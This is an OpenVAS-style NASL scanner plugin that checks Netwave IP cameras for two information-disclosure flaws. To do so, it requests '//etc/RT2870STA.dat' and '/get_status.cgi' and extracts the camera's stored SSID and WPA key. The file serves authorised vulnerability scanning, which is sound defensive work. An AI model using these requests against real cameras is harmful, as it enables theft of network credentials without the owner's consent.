# Copyright (C) 2018 Greenbone Networks GmbH
# Text descriptions are largely excerpted from the referenced
# advisory, and are Copyright (C) the respective author(s)
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if( description )
{
  script_oid("1.3.6.1.4.1.25623.1.0.113254");
  script_version("2019-08-29T09:52:29+0000");
  script_tag(name:"last_modification", value:"2019-08-29 09:52:29 +0000 (Thu, 29 Aug 2019)");
  script_tag(name:"creation_date", value:"2018-08-28 12:50:00 +0200 (Tue, 28 Aug 2018)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_cve_id("CVE-2018-11653", "CVE-2018-11654");

  script_name("Netwave IP Camera Information Disclosure Vulnerability");

  script_category(ACT_GATHER_INFO);

  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_netwave_ip_cam_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("netwave/ip_camera/detected");

  script_tag(name:"summary", value:"Netwave IP cameras are prone to multiple
  Information Disclosure Vulnerability.");

  script_tag(name:"vuldetect", value:"Tries to gather sensitive information.");

  script_tag(name:"insight", value:"Sensitive information can be acquired by unauthorized attackers
  via visiting /get_status.cgi and //etc/RT2870STA.dat.");

  script_tag(name:"affected", value:"All versions of Netwave IP camera.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"https://github.com/SadFud/Exploits/tree/master/Real%20World/SCADA%20-%20IOT%20Systems/CVE-2018-11653");
  script_xref(name:"URL", value:"https://github.com/SadFud/Exploits/tree/master/Real%20World/SCADA%20-%20IOT%20Systems/CVE-2018-11654");

  exit(0);
}

CPE = "cpe:/h:netwave:ip_camera";

include( "host_details.inc" );
include( "misc_func.inc" );
include( "http_func.inc" );
include( "http_keepalive.inc" );

if( ! port = get_app_port( cpe: CPE ) ) exit( 0 );
if( ! location = get_app_location( cpe: CPE, port: port ) ) exit( 0 );

if( location == "/" )
  location = "";

report = ""; # nb: To make openvas-nasl-lint happy...

attack_url = location + '//etc/RT2870STA.dat';
req = http_get_req( port: port, url: attack_url, accept_header: '*/*', host_header_use_ip: TRUE,
  user_agent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36' );
buf = http_keepalive_send_recv( port: port, data: req );
if( buf =~ 'SSID=' && buf =~ 'WPAPSK=' ) {
  report += report_vuln_url( port: port, url: attack_url );
  wpa_info = eregmatch( string: buf, pattern: 'SSID=([^\r\n]+).+WPAPSK=([^\r\n]+)', icase: TRUE );
  if( !isnull( wpa_info[1] )  && ! isnull( wpa_info[2] ) ) {
    report += '\r\nWPA Credentials acquired: "' + wpa_info[1] + ":" + wpa_info[2] + '"';
  }
}

attack_url = location + '/get_status.cgi';
req = http_get_req( port: port, url: attack_url, accept_header: '*/*', host_header_use_ip: TRUE,
  user_agent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36' );
buf = http_keepalive_send_recv( port: port, data: req );
if( buf =~ 'var alias=' && buf =~ 'var ddns_host=' ) {
  if( report != "" )
    report += '\r\n\r\n';
  report += report_vuln_url( port: port, url: attack_url );
}

if( report != "" ) {
  security_message( port: port, data: report );
  exit( 0 );
}

exit( 99 );
